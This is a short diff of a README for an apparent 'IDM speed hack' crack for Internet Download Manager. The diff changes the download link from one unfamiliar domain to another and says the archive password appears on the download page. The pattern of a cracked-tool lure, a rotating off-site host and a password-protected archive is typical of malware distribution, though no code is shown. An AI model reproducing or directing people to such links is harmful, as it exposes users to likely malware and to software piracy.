@@ -18,7 +18,7 @@ Unlocks IDM's connection count limit and disables throttle detection for maximum
 
 ## Download
 
-[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/idmspeedhack)
+[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/idmspeedhack)
 
 > The archive password is shown on the download page.
 
